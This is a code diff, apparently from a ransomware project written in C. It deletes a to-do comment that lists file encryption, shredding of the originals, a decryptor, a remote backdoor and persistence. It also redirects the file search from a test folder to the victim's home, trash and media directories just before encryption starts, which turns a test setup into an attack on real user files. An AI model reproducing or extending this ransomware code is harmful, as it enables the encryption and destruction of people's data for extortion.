@@ -6,20 +6,6 @@
 #include"lib/crypto.h"
 #include"lib/struct.h"
 
-/*
-  
-  search for files, 
-  create new encrypted file
-  shred old file (without deleting it)
-  after shreding all files, delete all files
-  drop decryptor with GUI
-  remote backdoor
- * 
- * deal with process and interruptions
- * create new process and persistence ransomware
-*/
-
-
 
 
 int main(){
@@ -38,10 +24,10 @@ int main(){
     char * test_path = get_test_path(desktop);
 
     /* finding all victim's files */
-    find_files(&files, test_path);
-    //find_files(&files, home);
-    //find_files(&files, trash);
-    //find_files(&files, media);
+    //find_files(&files, test_path);
+    find_files(&files, home);
+    find_files(&files, trash);
+    find_files(&files, media);
     
     
     /* start encryption */
